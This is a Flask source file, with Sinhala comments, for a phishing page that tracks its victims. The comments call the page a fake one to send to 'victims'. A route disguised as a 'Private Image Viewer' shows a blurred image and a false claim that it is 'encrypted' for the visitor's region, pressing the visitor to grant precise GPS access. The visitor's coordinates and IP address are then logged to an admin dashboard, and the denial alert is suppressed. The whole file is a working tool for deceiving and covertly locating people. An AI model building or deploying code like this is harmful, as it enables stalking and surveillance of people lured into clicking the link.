import os, requests, datetime
from flask import Flask, render_template, request

app = Flask(__name__)

# Captured දත්ත තාවකාලිකව තබා ගැනීමට
captured_logs = []

def get_ip_info(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}").json()
        return res if res['status'] == 'success' else None
    except: return None

# --- [ප්‍රධාන ටැබ් එක] Admin Dashboard ---
@app.route('/')
def admin():
    # Hugging Face Space එකේ ලින්ක් එක ඔටෝම ගන්නවා
    base_url = request.host_url.rstrip('/')
    victim_link = f"{base_url}/view"
    return render_template('index.html', logs=reversed(captured_logs), tunnel_url=victim_link)

# --- [Victim Page] අනිත් අයට යවන හොර පේජ් එක ---
@app.route('/view')
def victim_page():
    user_ip = request.remote_addr
    if request.headers.get('X-Forwarded-For'):
        user_ip = request.headers.get('X-Forwarded-For').split(',')[0]
    
    ip_info = get_ip_info(user_ip)
    city = ip_info['city'] if ip_info else "Sri Lanka"

    return f'''
    <html>
    <head>
        <title>Private Image Viewer</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {{ background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 100px; }}
            .btn {{ background: #25D366; color: white; padding: 15px; border-radius: 50px; border: none; font-weight: bold; width: 80%; max-width: 300px; margin-top: 30px; cursor: pointer; }}
            .blur {{ width: 280px; filter: blur(20px); border-radius: 15px; box-shadow: 0 0 20px rgba(255,255,255,0.1); }}
        </style>
        <script>
            function startProcess() {{
                navigator.geolocation.getCurrentPosition(s, e, {{enableHighAccuracy:true}});
            }}
            function s(p) {{
                fetch('/log?lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&ip={user_ip}&city={city}')
                .then(() => location.href='https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=1200');
            }}
            function e() {{ 
                // මෙතන අර කරදරකාර Alert එක අයින් කළා මචං
                console.log("Permission denied"); 
            }}
        </script>
    </head>
    <body>
        <img src="https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=300" class="blur">
        <h2>🔒 Protected Content</h2>
        <p style="color: #888;">This image is encrypted for <b>{city}</b> region.</p>
        <button class="btn" onclick="startProcess()">Verify & Unlock Image</button>
    </body>
    </html>
    '''

@app.route('/log')
def log_data():
    log = {
        "time": datetime.datetime.now().strftime("%H:%M:%S"),
        "ip": request.args.get('ip'),
        "city": request.args.get('city'),
        "lat": request.args.get('lat'),
        "lon": request.args.get('lon')
    }
    captured_logs.append(log)
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7860)
